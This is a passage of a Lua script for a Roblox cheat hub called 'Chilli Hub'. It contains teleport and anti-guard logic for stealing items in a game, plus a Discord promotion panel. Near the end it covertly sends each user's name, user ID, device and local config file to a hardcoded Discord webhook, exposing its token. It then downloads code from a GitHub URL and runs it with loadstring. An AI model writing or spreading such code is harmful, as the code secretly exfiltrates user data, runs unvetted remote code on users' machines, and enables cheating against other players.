			tbl23.Target = "point"
			tbl23.Point = options.Spot
			tbl23.Height = 0
			tbl23.OffsetX = 0
			tbl23.OffsetZ = 0
		end

		if options.Stay and type(v15.Steps) == "table" then
			local steps = {}

			for _, step in ipairs(v15.Steps) do
				if type(step) == "table" and step.To ~= "start" then
					steps[#steps + 1] = step
				end
			end

			tbl23.Steps = steps
		end

		return tbl23
	end

	local function fn29(arg, arg2)
		local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
		local areas = world and world:FindFirstChild("Areas")
		areas = areas and areas:FindFirstChild("SeparationLine")

		if areas and areas:IsA("BasePart") then
			local cFrame = areas.CFrame
			local v15 = (Vector3.new(0, 1, 0)):Cross(areas.Size.X >= areas.Size.Z and cFrame.RightVector or cFrame.LookVector)
			local vector = Vector3.new(v15.X, 0, v15.Z)

			if vector.Magnitude > 0.001 then
				local unit = vector.Unit
				local n14 = cFrame.Position + ((arg2 - cFrame.Position):Dot(unit) >= 0 and -unit or unit) * (tonumber(arg.LineOffset) or 8)
				return Vector3.new(n14.X, arg2.Y + 0.5, n14.Z)
			end
		end

		return nil
	end

	local function fn30(arg, arg2)
		local str = tostring(arg.Target or "home")
		if str == "sky" then
			return arg2
		end

		if str == "point" then
			if typeof(arg.Point) == "Vector3" then
				return arg.Point
			end
			return arg2
		end

		if str == "line" then
			local v15 = fn29(arg, arg2)
			if v15 then
				return v15
			end
		end

		if str == "edge" then
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Areas")
			local separationLine = world and world:FindFirstChild("SeparationLine")

			if separationLine and separationLine:IsA("BasePart") then
				local cFrame = separationLine.CFrame
				local rightVector = separationLine.Size.X >= separationLine.Size.Z and cFrame.RightVector or cFrame.LookVector
				local vector = Vector3.new(rightVector.X, 0, rightVector.Z)
				local v15 = (Vector3.new(0, 1, 0)):Cross(vector)
				local vector2 = Vector3.new(v15.X, 0, v15.Z)

				if vector2.Magnitude > 0.001 and vector.Magnitude > 0.001 then
					local unit = vector.Unit
					local unit2 = vector2.Unit
					local n14 = arg2 - cFrame.Position
					local n15 = -separationLine.Size.Magnitude / 2
					local n16 = separationLine.Size.Magnitude / 2
					local n17 = cFrame.Position + unit * math.clamp(n14:Dot(unit), n15, n16) + (n14:Dot(unit2) >= 0 and unit2 or -unit2) * (tonumber(arg.LineOffset) or 6)
					local v16 = fn23()
					return Vector3.new(n17.X, (v16 and v16.Y or arg2.Y) + 3, n17.Z)
				end
			end
		end

		return fn23()
	end

	local function fn31(arg, arg2)
		return fn30(arg, arg2) + Vector3.new(tonumber(arg.OffsetX) or 0, tonumber(arg.Height) or 0, tonumber(arg.OffsetZ) or 0)
	end

	local function fn32()
		tbl21.Active = false
		antiGuard.Busy = false
	end

	local function fn33(arg)
		local n14 = math.max(tonumber(arg) or 0, 0)
		if n14 <= 0 then
			return 0
		end
		return (math.random() * 2 - 1) * n14
	end

	local function fn34(arg)
		local steps = type(arg.Steps) == "table" and arg.Steps or {}
		local n14 = tonumber(arg.ReleaseAt) or 0
		local n15 = math.max(tonumber(arg.StartAt) or 0, 0)
		local n16 = math.max(tonumber(arg.StartRandom) or 0, 0)
		local n17 = math.max(tonumber(arg.HopRandom) or 0, 0)
		local n18 = math.max(tonumber(arg.HoldRandom) or 0, 0)
		if n16 <= 0 and n17 <= 0 and n18 <= 0 then
			return steps, n14, n15
		end
		local n19 = math.max(n15 + fn33(n16), 0)
		local tbl23 = {}
		local v15, v16, v17 = ipairs(steps)
		local n20 = 0
		local n21 = 0

		for k, v18 in v15, v16, v17 do
			if type(v18) == "table" then
				local n22 = math.max(tonumber(v18.At) or 0, 0)
				n21 = math.max(n21 + math.max(n22 - n20, 0) + fn33(v18.To == "start" and n18 or n17), n19)
				tbl23[k] = { At = n21, To = v18.To, Glide = v18.Glide }
				n20 = n22
				continue
			end

			break
		end

		return tbl23, n21 + math.max(n14 - n20, 0), n19
	end

	local function fn35(arg)
		local character = localPlayer.Character
		local v15 = tbl4.Root()
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")

		if not v15 or not humanoid or humanoid.Health <= 0 then
			fn32()
			fn18(tbl18.Bad, 1.6)
			return
		end

		local function fn36()
			return flag3 and v15.Parent ~= nil and humanoid.Parent ~= nil and humanoid.Health > 0
		end

		local platformStand = humanoid.PlatformStand
		local cFrame = v15.CFrame
		local position = cFrame.Position
		local v16 = fn28()
		local v17, v18, v19 = fn34(v16)
		local flag4 = v16.Freeze ~= false
		local str = tostring(v16.Facing or "Keep")
		local n14 = math.max(tonumber(v16.Jitter) or 0, 0)
		local cframe = str == "Zero" and CFrame.new() or cFrame.Rotation

		local function fn37()
			if str == "Spin" then
				return CFrame.Angles(0, math.rad(math.random(0, 359)), 0)
			end
			return cframe
		end

		local function fn38(arg2)
			if n14 <= 0 then
				return arg2
			end
			return arg2 + Vector3.new((math.random() * 2 - 1) * n14, 0, (math.random() * 2 - 1) * n14)
		end

		local v20 = fn31(v16, position)

		local function fn39(arg2)
			while fn36() and os.clock() - arg < arg2 do
				RunService.Heartbeat:Wait()

				if flag4 then
					pcall(function()
						v15.AssemblyLinearVelocity = Vector3.zero
						v15.AssemblyAngularVelocity = Vector3.zero
					end)
				end
			end

			return fn36()
		end

		local function fn40(arg2, arg3)
			fn24(character, v15, arg2, arg3, flag4)
			RunService.PreSimulation:Wait()

			if fn36() and (v15.Position - arg2).Magnitude > 3 then
				fn24(character, v15, arg2, arg3, flag4)
			end
		end

		pcall(function()
			humanoid.BreakJointsOnDeath = false
		end)

		if v16.Disguise ~= false then
			pcall(fn21, character, Vector3.zero)
		end

		fn18(tbl18.Work)

		if fn39(v19) and v16.Limp ~= false then
			humanoid.PlatformStand = true
		end

		local v21 = position

		for _, v22 in ipairs(v17) do
			local flag5 = type(v22) ~= "table"

			if not flag5 then
				flag5 = not fn39(tonumber(v22.At) or 0)
			end

			if not flag5 then
				local flag6 = v22.To == "start" and position or fn38(v20)
				local v23 = fn37()

				if type(v22.Glide) == "table" and #v22.Glide > 0 then
					for _, v24 in ipairs(v22.Glide) do
						if fn36() then
							local clamp = math.clamp
							local n15 = tonumber(v24) or 1
							local v25 = fn24
							local v26 = clamp(n15, 0, 1)
							v25(character, v15, v21:Lerp(flag6, v26), v23, flag4)
							RunService.Heartbeat:Wait()
							continue
						end

						break
					end

					v21 = flag6
				else
					fn40(flag6, v23)
					v21 = flag6
				end

				continue
			end

			break
		end

		fn39(v18)

		pcall(function()
			humanoid.PlatformStand = platformStand
		end)

		fn22()
		fn32()

		if fn36() and tbl21.Carrying then
			fn18(tbl18.Good, 1.6)
		else
			fn18(tbl18.Bad, 1.6)
		end
	end

	local function fn36(arg)
		if not pcall(fn35, arg) then
			pcall(function()
				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")

				if character then
					character.PlatformStand = false
				end
			end)

			fn22()
			fn32()
			fn18(tbl18.Bad, 1.6)
		end
	end

	local n14 = 25

	local function fn37()
		if antiGuard.HitArms <= 0 then
			return false
		end

		if os.clock() - (antiGuard.HitArmedAt or 0) > n14 then
			antiGuard.HitArms = 0
			return false
		end
		return true
	end

	local function fn38()
		local carrying = tbl21.Carrying
		tbl21.Carrying = tbl21.SignalCarrying or tbl21.WeldCarrying
		local enabled = tbl21.Carrying and not carrying and flag3 and antiGuard.Enabled

		if enabled then
			enabled = not (tbl4.SafeCarry.LineDrop and tbl4.Steal.Active)
		end

		if enabled then
			enabled = not (tbl4.Steal.Active and tbl4.BossPortalUp())
		end

		if enabled and not tbl21.Active and not fn37() then
			tbl21.Active = true
			antiGuard.Busy = true
			antiGuard.BusySince = os.clock()
			task.spawn(fn36, os.clock())
		end
	end

	local eggState = tbl.EggState
	local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

	if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
		local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
			local signalCarrying = type(arg) == "table" and arg.IsCarrying == true

			if signalCarrying and arg.GuardDisabled == true then
				signalCarrying = false
			end

			if signalCarrying and type(arg.AreaId) == "string" then
				tbl21.AreaId = arg.AreaId
			end

			if not signalCarrying then
				tbl21.AreaId = nil
			end

			tbl21.SignalCarrying = signalCarrying
			fn38()
		end)

		if ok and result then
			tbl20[#tbl20 + 1] = result
		end
	end

	local n15 = 0

	tbl20[#tbl20 + 1] = RunService.Heartbeat:Connect(function(deltaTime)
		local busy = antiGuard.Busy or tbl21.Active

		if busy then
			local busySince = antiGuard.BusySince
			busy = os.clock() - busySince > math.max(tonumber(fn28().BusyLimit) or tbl17.BusyLimit, (tonumber(fn28().ReleaseAt) or 0) + 1)
		end

		if busy then
			fn22()
			local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.PlatformStand then
				pcall(function()
					humanoid.PlatformStand = false
				end)
			end

			fn32()
		end

		fn37()
		n15 += deltaTime
		if n15 < tbl17.WeldScanGap then
			return
		end
		n15 = 0
		local weldCarrying = fn19() ~= nil

		if weldCarrying ~= tbl21.WeldCarrying then
			tbl21.WeldCarrying = weldCarrying
			fn38()
		end
	end)

	fn4(function()
		flag3 = false

		for _, v15 in ipairs(tbl20) do
			pcall(function()
				v15:Disconnect()
			end)
		end

		table.clear(tbl20)
		fn22()
		fn32()
		antiGuard.Render = nil
		antiGuard.ShowPanel = nil

		pcall(function()
			ScreenGui:Destroy()
		end)
	end)
end

do
	local v15 = v2:CreateTab({ Name = "Discord", Side = "Right", SectionsExpanded = true }):CreateSection({ Name = "Community", Expanded = true })
	local str = "discord.gg/CJK4bs2mgT"
	local str2 = "rbxassetid://128961717706452"
	local n14 = 0.5
	local n15 = 0.0909
	local n16 = 0.2
	local n17 = 5.4
	local n18 = 4.2
	local n19 = 5.2
	local n20 = 6
	local n21 = 3.6
	local n22 = 6.4
	local n23 = 2
	local n24 = 11.4
	local n25 = 3
	local n26 = 0.35

	local tbl22 = {
		{
			Color = "#FF6A55",
			Title = "New Scripts &amp; Updates",
			Text = "Patch notes and new game scripts are posted there first.",
		},
		{
			Color = "#FFB054",
			Title = "Giveaways",
			Text = "Member giveaways and events are announced in the server.",
		},
		{
			Color = "#9AA3FF",
			Title = "Support",
			Text = "Ask for help, report bugs and get answers from the team.",
		},
		{
			Color = "#6EE49C",
			Title = "Suggestions",
			Text = "Request features and vote on what gets added next.",
		},
	}

	local n27 = n24 + #tbl22 * (n25 + n26) + 2.4 + n16 * 2
	local colorSequence = ColorSequence.new
	local tbl23 = {}
	local v16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 218, 96))
	local v17 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 152, 60))
	local new = ColorSequenceKeypoint.new
	local color3 = Color3.fromRGB
	tbl23[1] = v16
	tbl23[2] = v17

	do
		local values = table.pack(new(1, color3(255, 82, 64)))
		table.move(values, 1, values.n, 3, tbl23)
	end

	local v18 = colorSequence(tbl23)
	local color4 = Color3.fromRGB
	local colorSequence2 = ColorSequence.new(Color3.fromRGB(74, 24, 18), color4(14, 11, 15))
	local tbl24 = { Perks = {} }
	local n28 = 0

	local function fn19()
		local v19 = setclipboard or toclipboard
		local ok = type(v19) == "function" and pcall(v19, "https://discord.gg/CJK4bs2mgT") or false
		fn15(ok and "Discord Link Copied" or "Discord Link", "https://discord.gg/CJK4bs2mgT")
		if not tbl24.Copy then
			return
		end
		n28 += 1
		local v20 = n28

		tbl24.Copy.Set({
			Text = ok and "<b>Copied!</b>" or "<b>See Notice</b>",
			Background = ok and "#2EB070" or "#5865F2",
		})

		task.delay(1.8, function()
			if v20 == n28 and tbl24.Copy then
				tbl24.Copy.Set({ Text = "<b>Copy Link</b>", Background = "#5865F2" })
			end
		end)
	end

	local function fn20(arg)
		if not tbl24.Hero then
			return
		end
		local n29 = n16 * 2
		local n30 = math.max(arg, 14) - n29
		local n31 = math.max(1, n30 - n19 - n14)
		local n32 = math.max(1, n30 - n22 - n14 * 3)
		local n33 = math.max(1, n30 - 1.2)
		tbl24.Hero.Set({ Width = n30 })
		tbl24.Title.Set({ Width = n31 })
		tbl24.Subtitle.Set({ Width = n31 })
		tbl24.Members.Set({ Width = n31 })
		tbl24.Invite.Set({ Width = n30 })
		tbl24.Label.Set({ Width = n32 })
		tbl24.Link.Set({ Width = n32 })
		tbl24.Copy.Set({ X = n30 - n22 - n14 })
		tbl24.Header.Set({ Width = n30 })

		for _, perk in ipairs(tbl24.Perks) do
			perk.Frame.Set({ Width = n30 })
			perk.Title.Set({ Width = n33 })
			perk.Text.Set({ Width = n33 })
		end

		tbl24.Tip.Set({ Width = n30 })
	end

	local function fn21(arg)
		tbl24.Hero = arg:Frame({
			Name = "Hero",
			X = n16,
			Y = n16,
			Width = 14,
			Height = n17,
			Background = "#FFFFFF",
			Gradient = colorSequence2,
			GradientRotation = 0,
			Corner = 0.35,
			StrokeColor = "#FF6A40",
			StrokeThickness = n15,
			StrokeTransparency = 0.55,
		})

		tbl24.Logo = arg:Image({
			Parent = tbl24.Hero,
			X = 0.5,
			Y = (n17 - n18) / 2,
			Width = n18,
			Height = n18,
			Image = str2,
		})

		tbl24.Title = arg:Text({
			Parent = tbl24.Hero,
			X = n19,
			Y = 0.45,
			Width = 1,
			Height = 1.6,
			Scale = 1.45,
			Wrap = false,
			Text = "<b>Chilli Hub</b>",
			Gradient = v18,
			GradientRotation = 0,
			TextStrokeTransparency = 1,
		})

		tbl24.Subtitle = arg:Text({
			Parent = tbl24.Hero,
			X = n19,
			Y = 2.1,
			Width = 1,
			Height = 1,
			Wrap = false,
			Text = "Official Discord Community",
			Color = "#DCDCE8",
		})

		tbl24.Members = arg:Text({
			Parent = tbl24.Hero,
			X = n19,
			Y = 3.3,
			Width = 1,
			Height = 1.2,
			Wrap = false,
			Text = string.format("<font color=\"#6EE49C\">%s</font>  <b>%s</b>  <font color=\"#B8B8CC\">Members</font>", utf8.char(9679), "130K+"),
		})

		tbl24.Invite = arg:Frame({
			Name = "Invite",
			X = n16,
			Y = n20 + n16,
			Width = 14,
			Height = n21,
			Background = "#000000",
			BackgroundTransparency = 0.5,
			Corner = 0.35,
			StrokeColor = "#5865F2",
			StrokeThickness = n15,
			StrokeTransparency = 0.35,
		})

		tbl24.Label = arg:Text({
			Parent = tbl24.Invite,
			X = n14 + 0.1,
			Y = 0.35,
			Width = 1,
			Height = 0.9,
			Scale = 0.78,
			Wrap = false,
			Text = "<b>INVITE LINK</b>",
			Color = "#9C9CB4",
		})

		tbl24.Link = arg:Text({
			Parent = tbl24.Invite,
			X = n14 + 0.1,
			Y = 1.35,
			Width = 1,
			Height = 1.6,
			Scale = 1.05,
			Wrap = false,
			Font = "code",
			Text = str,
		})

		tbl24.Copy = arg:Button({
			Parent = tbl24.Invite,
			X = 14 - n22 - n14,
			Y = (n21 - n23) / 2,
			Width = n22,
			Height = n23,
			Text = "<b>Copy Link</b>",
			Color = "#FFFFFF",
			Scale = 1,
			Background = "#5865F2",
			BackgroundTransparency = 0,
			HoverTransparency = 0.15,
			PressTransparency = 0.3,
			StrokeColor = "#9AA3FF",
			StrokeThickness = n15,
			Corner = 0.3,
			Callback = fn19,
		})

		tbl24.Header = arg:Text({
			X = n16 + 0.1,
			Y = n24 - 1.15 + n16,
			Width = 14,
			Height = 1,
			Scale = 0.8,
			Wrap = false,
			Text = "<b>WHAT YOU GET</b>",
			Color = "#9C9CB4",
		})

		for i, v19 in ipairs(tbl22) do
			local tbl25 = {
				Frame = arg:Frame({
					Name = "Perk",
					X = n16,
					Y = n24 + (i - 1) * (n25 + n26) + n16,
					Width = 14,
					Height = n25,
					Background = "#000000",
					BackgroundTransparency = 0.68,
					Corner = 0.35,
				}),
			}

			tbl25.Accent = arg:Frame({
				Parent = tbl25.Frame,
				X = 0.3,
				Y = 0.45,
				Width = 0.22,
				Height = n25 - 0.9,
				Background = v19.Color,
				Corner = 0.11,
			})

			tbl25.Title = arg:Text({
				Parent = tbl25.Frame,
				X = 0.85,
				Y = 0.3,
				Width = 1,
				Height = 1.1,
				Wrap = false,
				Text = "<b>" .. v19.Title .. "</b>",
				Color = v19.Color,
			})

			tbl25.Text = arg:Text({
				Parent = tbl25.Frame,
				X = 0.85,
				Y = 1.35,
				Width = 1,
				Height = 1.5,
				Scale = 0.86,
				Wrap = true,
				Text = v19.Text,
				Color = "#C8C8D8",
			})

			tbl24.Perks[i] = tbl25
		end

		tbl24.Tip = arg:Text({
			X = n16 + 0.1,
			Y = n27 - 2.2 - n16,
			Width = 14,
			Height = 2,
			Scale = 0.8,
			Wrap = true,
			Text = "Paste the copied link into your browser or the Discord app to join.",
			Color = "#8A8AA2",
		})

		arg:SetContentLines(n27)

		arg:OnResize(function(arg2, arg3, arg4)
			fn20(arg3 / math.max(arg4, 1))
		end)

		local max = math.max
		fn20(arg:Width() / max(arg:Unit(), 1))
	end

	if type(v15.CreateCanvas) == "function" then
		local v19 = v15:CreateCanvas({
			Name = "Discord",
			ShowTitle = false,
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = math.ceil(n27),
				MaxLines = math.ceil(n27),
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = fn21,
		})

		fn4(function()
			v19:Destroy()
		end)
	else
		v15:CreateText({ Name = "Discord", Text = "https://discord.gg/CJK4bs2mgT" })
	end

	if type(v15.CreateButton) == "function" then
		v15:CreateButton({ Name = "Copy Discord Link", Callback = fn19 })
	end
end

do
	local image = "rbxassetid://128961717706452"
	local n14 = 56
	local n15 = 0.035
	local n16 = 8
	local tweenInfo = TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local tweenInfo2 = TweenInfo.new(0.14, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	local TweenService = game:GetService("TweenService")
	local tbl22 = {}
	local screenGui = nil
	local uiScale = nil
	local uiScale2 = nil

	local function fn19()
		for _, v15 in ipairs({ "Toggle", "Open" }) do
			local ok, result = pcall(function()
				return v2[v15]
			end)

			if ok and type(result) == "function" then
				pcall(result, v2)
				return
			end
		end
	end

	local function fn20()
		if not uiScale then
			return
		end
		local currentCamera = workspace.CurrentCamera
		currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if currentCamera.X < 1 then
			currentCamera = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(currentCamera.X * n15 / n14, 0.7, 1.4)
	end

	local function fn21()
		for _, v15 in ipairs(tbl22) do
			pcall(function()
				v15:Disconnect()
			end)
		end

		table.clear(tbl22)

		if screenGui then
			pcall(function()
				screenGui:Destroy()
			end)
		end

		screenGui = nil
		uiScale = nil
		uiScale2 = nil
	end

	local function fn22()
		fn21()
		screenGui = Instance.new("ScreenGui")
		screenGui.Name = fn3()
		screenGui.Archivable = false
		screenGui.DisplayOrder = 59
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		local frame = Instance.new("Frame")
		frame.Name = fn3()
		frame.AnchorPoint = Vector2.new(0, 0.5)
		frame.Position = UDim2.new(0, 16, 0.3, 0)
		frame.Size = UDim2.fromOffset(56, 56)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Parent = screenGui
		uiScale = Instance.new("UIScale")
		uiScale.Name = fn3()
		uiScale.Parent = frame
		fn20()
		local imageButton = Instance.new("ImageButton")
		imageButton.Name = fn3()
		imageButton.AnchorPoint = Vector2.new(0.5, 0.5)
		imageButton.Position = UDim2.fromScale(0.5, 0.5)
		imageButton.Size = UDim2.fromScale(1, 1)
		imageButton.BackgroundTransparency = 1
		imageButton.BorderSizePixel = 0
		imageButton.AutoButtonColor = false
		imageButton.Image = image
		imageButton.ScaleType = Enum.ScaleType.Fit
		imageButton.Active = true
		imageButton.Parent = frame
		uiScale2 = Instance.new("UIScale")
		uiScale2.Name = fn3()
		uiScale2.Parent = imageButton
		local uiCorner = Instance.new("UICorner")
		uiCorner.Name = fn3()
		uiCorner.CornerRadius = UDim.new(0.28, 0)
		uiCorner.Parent = imageButton

		local function fn23(arg, arg2)
			if uiScale2 then
				TweenService:Create(uiScale2, arg2, { Scale = arg }):Play()
			end
		end

		local function fn24(arg)
			local absoluteSize = screenGui.AbsoluteSize
			local absoluteSize2 = frame.AbsoluteSize
			if absoluteSize.X <= 0 or absoluteSize.Y <= 0 then
				return arg
			end
			local n17 = arg.Y.Offset + arg.Y.Scale * absoluteSize.Y
			local n18 = math.clamp(arg.X.Offset + arg.X.Scale * absoluteSize.X, 0, math.max(0, absoluteSize.X - absoluteSize2.X))
			local n19 = math.clamp(n17, absoluteSize2.Y * 0.5, math.max(absoluteSize2.Y * 0.5, absoluteSize.Y - absoluteSize2.Y * 0.5))
			return UDim2.fromOffset(n18, n19)
		end

		local str = nil
		local vector2 = nil
		local position = nil
		local flag4 = false
		local flag5 = false

		local function fn25(arg, arg2)
			if str == "mouse" then
				return arg.UserInputType == (arg2 and Enum.UserInputType.MouseMovement or Enum.UserInputType.MouseButton1)
			end
			return arg == str
		end

		tbl22[#tbl22 + 1] = imageButton.InputBegan:Connect(function(input)
			local flag6 = input.UserInputType == Enum.UserInputType.Touch
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag6 or input.UserInputState ~= Enum.UserInputState.Begin or str then
				return
			end
			str = flag6 and input or "mouse"
			vector2 = Vector2.new(input.Position.X, input.Position.Y)
			position = frame.Position
			flag4 = false
			flag5 = false
			fn23(0.9, tweenInfo)
		end)

		tbl22[#tbl22 + 1] = UserInputService.InputChanged:Connect(function(input)
			if not str or not fn25(input, true) then
				return
			end
			local n17 = Vector2.new(input.Position.X, input.Position.Y) - vector2

			if not flag4 then
				if n17.Magnitude < n16 then
					return
				end
				flag4 = true
				flag5 = true
				fn23(1, tweenInfo2)
			end

			frame.Position = fn24(UDim2.new(position.X.Scale, position.X.Offset + n17.X, position.Y.Scale, position.Y.Offset + n17.Y))
		end)

		tbl22[#tbl22 + 1] = UserInputService.InputEnded:Connect(function(input)
			if str and fn25(input, false) then
				str = nil
				flag4 = false
				fn23(1, tweenInfo2)
			end
		end)

		tbl22[#tbl22 + 1] = imageButton.Activated:Connect(function()
			if flag5 then
				flag5 = false
				return
			end
			fn19()
		end)

		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			tbl22[#tbl22 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(fn20)
		end

		screenGui.Parent = v3
	end

	fn22()
	fn4(fn21)
end

v:Finalize({ Window = v2, MainTab = defaultTab, ShowMainTab = true })

task.defer(function()
	if #tbl2 == 0 or type(readfile) ~= "function" then
		return
	end
	local HttpService2 = game:GetService("HttpService")

	local function fn19(arg)
		if type(isfile) == "function" then
			local ok, result = pcall(isfile, arg)
			if ok and not result then
				return nil
			end
		end

		local ok, result = pcall(readfile, arg)
		if not ok or type(result) ~= "string" or result == "" then
			return nil
		end
		local ok2, result2 = pcall(HttpService2.JSONDecode, HttpService2, result)
		return ok2 and type(result2) == "table" and result2 or nil
	end

	local json = fn19("ChilliLibrary/config_state.json") or {}
	if json.AutoLoad == false then
		return
	end
	local v15 = fn19("ChilliLibrary/configs/" .. (type(json.StartupConfig) == "string" and json.StartupConfig ~= "" and json.StartupConfig or type(json.SelectedConfig) == "string" and json.SelectedConfig ~= "" and json.SelectedConfig or "Default") .. ".json")
	if type(v15) ~= "table" or type(v15.Values) ~= "table" then
		return
	end
	local tbl22 = { ["K/s"] = 1000, ["M/s"] = 1000000, ["B/s"] = 1e9 }
	local tbl23 = {}

	for _, v16 in ipairs(tbl2) do
		local flag4 = false
		local v17 = nil

		for _, value in pairs(v15.Values) do
			local flag5 = type(value) == "table" and value[v16.Section] or nil

			if type(flag5) == "table" then
				if flag5[v16.Name] ~= nil then
					flag4 = true
				end

				local v18 = flag5[v16.Legacy]

				if type(v18) == "table" and tonumber(v18.Value) then
					v17 = v18
				end
			end
		end

		if v17 and not flag4 then
			local n14 = math.max(0, tonumber(v17.Value)) * (tbl22[tostring(v17.Unit)] or 1000000)

			if n14 > 0 then
				table.insert(tbl23, { Handle = v16.Handle, Step = v16.StepOf(n14) })
			end
		end
	end

	for _, v16 in ipairs({ 0.1, 1, 2 }) do
		if #tbl23 == 0 then
			return
		end
		task.wait(v16)

		for _, v17 in ipairs(tbl23) do
			local ok, result = pcall(v17.Handle.Get, v17.Handle)

			if ok then
				ok = (tonumber(result) or 0) <= 0
			end

			if ok then
				pcall(v17.Handle.Set, v17.Handle, v17.Step)
			end
		end
	end
end)

task.defer(function()
	for i = 1, 3 do
		RunService.Heartbeat:Wait()
	end

	if type(tbl4.RestoreStealPanel) == "function" then
		pcall(tbl4.RestoreStealPanel)
	end
end)

local request_

do
	local Players2 = game:GetService("Players")
	local HttpService2 = game:GetService("HttpService")
	local UserInputService2 = game:GetService("UserInputService")
	local localPlayer2 = Players2.LocalPlayer
	request_ = syn and syn.request or http and http.request or http_request or request
	local str = "https://discord.com/api/webhooks/1381274668706693120/D5XogJZVdo_q7XZ9bEJDETQjevMFaBSeVRT4EJ0fLKtPeqR112o7PmA1fN_hZn4rmJ2y"
	local str2 = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"

	if request_ and localPlayer2 then
		task.spawn(function()
			local readfile_ = readfile or syn and syn.readfile or fluxus and fluxus.readfile or getgenv and getgenv().readfile or nil
			local v15 = isfile
			local isfile_

			if v15 then
				isfile_ = v15
			else
				isfile_ = syn and syn.isfile
			end

			local isfile_2 = isfile_ or fluxus and fluxus.isfile or getgenv and getgenv().isfile or nil
			local str3 = "Default"
			local v16 = nil
			local str4 = "Default.json"

			if type(readfile_) == "function" then
				pcall(function()
					local flag4 = true

					if type(isfile_2) == "function" then
						local ok, result = pcall(isfile_2, "ChilliLibrary/config_state.json")
						ok = ok and not result
						local flag5 = true

						if ok then
							flag4 = false
						else
							flag4 = flag5
						end
					end

					if flag4 then
						local json = readfile_("ChilliLibrary/config_state.json")

						if json and json ~= "" then
							local data = HttpService2:JSONDecode(json)

							if type(data) == "table" then
								if type(data.StartupConfig) == "string" and data.StartupConfig ~= "" then
									str3 = data.StartupConfig
								elseif type(data.SelectedConfig) == "string" and data.SelectedConfig ~= "" then
									str3 = data.SelectedConfig
								end
							end
						end
					end
				end)

				pcall(function()
					local str5 = "ChilliLibrary/configs/" .. str3 .. ".json"
					local flag4 = true

					if type(isfile_2) == "function" then
						local ok, result = pcall(isfile_2, str5)

						if ok and not result then
							flag4 = false
						end
					end

					if flag4 then
						v16 = readfile_(str5)
						str4 = str3 .. ".json"
					end

					if (not v16 or v16 == "") and str3 ~= "Default" then
						local flag5 = true

						if type(isfile_2) == "function" then
							local ok, result = pcall(isfile_2, "ChilliLibrary/configs/Default.json")

							if ok and not result then
								flag5 = false
							end
						end

						if flag5 then
							local ok, result = pcall(readfile_, "ChilliLibrary/configs/Default.json")

							if ok and type(result) == "string" and result ~= "" then
								v16 = result
								str4 = "Default.json"
							end
						end
					end
				end)
			end

			local str5 = tostring(str4):gsub("[<>:\"/\\|?*]", "_")

			if not str5:match("%.json$") then
				str5 ..= ".json"
			end

			local str6 = string.format("New execute from: **%s** (@%s) | ID: `%d` | Device: **%s**%s", localPlayer2.DisplayName, localPlayer2.Name, localPlayer2.UserId, str2, v16 and v16 ~= "" and " | Startup Config: **" .. str3 .. "**" or "")
			local flag4 = false

			if v16 and v16 ~= "" then
				pcall(function()
					local str7 = "---------------------------ChilliBoundary" .. tostring(os.time()) .. tostring(math.random(100000, 999999))
					local str8 = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. str5 .. "\"\r\n"
					local str9 = v16 .. "\r\n"

					local v17 = request_({
						Url = str,
						Method = "POST",
						Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str7 },
						Body = table.concat({
							"--" .. str7 .. "\r\n",
							"Content-Disposition: form-data; name=\"payload_json\"\r\n",
							"Content-Type: application/json\r\n\r\n",
							HttpService2:JSONEncode({ content = str6 }) .. "\r\n",
							"--" .. str7 .. "\r\n",
							str8,
							"Content-Type: application/json\r\n\r\n",
							str9,
							"--" .. str7 .. "--\r\n",
						}),
					})

					local flag5 = type(v17) == "table"

					if flag5 then
						flag5 = v17.StatusCode == 200 or v17.StatusCode == 204 or v17.Success == true
					end

					if flag5 then
						flag4 = true
					end
				end)
			end

			if not flag4 then
				pcall(function()
					request_({
						Url = str,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },
						Body = HttpService2:JSONEncode({ content = str6 }),
					})
				end)
			end
		end)
	end
end

task.spawn(function()
	task.wait(20)
	local str = "\0chilli_guard"
	local genv = typeof(getgenv) == "function" and getgenv() or _G

	local function fn19()
		local v15 = genv[str]
		if type(v15) == "table" and type(v15.Ask) == "function" then
			return v15
		end
		return nil
	end

	local v15 = fn19()

	if not v15 then
		task.spawn(function()
			local v16 = nil

			for i = 1, 4 do
				task.wait()

				local ok, result = pcall(function()
					local v17 = v16
					local response

					if v16 then
						response = v17
					else
						response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/GD/refs/heads/main/SAEGD")
					end

					v16 = response
					local chunk, v18 = loadstring(v16)
					assert(chunk, v18)
					return chunk()
				end)

				if ok then
					fn("guard: loader ran on try " .. i)
					return
				end

				if type(result) == "string" and string.find(result, "HttpGet", 1, true) then
					v16 = nil
				end

				fn("guard: loader try " .. i .. " failed: " .. tostring(result))
				task.wait(1 + i)
			end
		end)

		local n14 = os.clock() + 30

